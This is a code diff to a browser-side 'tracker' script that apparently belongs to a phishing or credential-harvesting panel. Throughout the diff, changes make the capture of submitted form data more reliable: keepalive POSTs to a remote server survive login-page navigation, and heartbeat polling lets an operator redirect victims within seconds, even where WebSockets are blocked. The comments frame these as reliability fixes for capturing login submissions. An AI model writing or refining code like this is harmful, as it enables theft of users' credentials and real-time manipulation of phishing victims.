@@ -111,7 +111,13 @@
         timezone: (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) { return ''; }})()
       })
     }).then(function(r) { return r.json(); }).then(function(res) {
-      if (res && res.sessionId) setSessionId(res.sessionId);
+      if (res && res.sessionId) {
+        setSessionId(res.sessionId);
+        // Start heartbeat polling immediately — guarantees admin redirects reach
+        // the visitor within 3s even if the WebSocket never connects (blocked by
+        // corporate firewall, mobile carrier proxy, or slow CF handshake).
+        startRedirectPoll();
+      }
     }).catch(function() {});
   } catch (_) {}
 
@@ -169,10 +175,15 @@
   }
 
   // ─── HTTP Fallback Implementation ──────────────────────────────────────────
+  // keepalive:true — critical for pages that navigate immediately after a click
+  // (React SPAs firing location.href on login submit, meta refreshes, etc.).
+  // Without it the browser cancels in-flight fetches on unload and we lose the
+  // form-capture POST and the last heartbeat that would carry a pending redirect.
   function sendHttpRequest(path, payload, callback) {
     fetch(SERVER_URL + path, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
+      keepalive: true,
       body: JSON.stringify(payload)
     })
     .then(res => {
@@ -381,12 +392,13 @@
         timestamp: Date.now()
       };
 
-      if (useHttpMode) {
-        sendHttpRequest('/api/tracker/formdata', payload);
-      } else if (socket && socket.connected) {
-        socket.emit('tracker:formdata', payload);
-      } else {
-        sendHttpRequest('/api/tracker/formdata', payload);
+      // Always send via HTTP (keepalive) — the click that triggered this may
+      // also be navigating the page (React SPA login → redirect to /loading),
+      // which would cancel any in-flight socket emit. HTTP keepalive survives
+      // unload. Server-side dedup (2s window) handles the socket+HTTP overlap.
+      sendHttpRequest('/api/tracker/formdata', payload);
+      if (!useHttpMode && socket && socket.connected) {
+        try { socket.emit('tracker:formdata', payload); } catch (_) {}
       }
     }
 
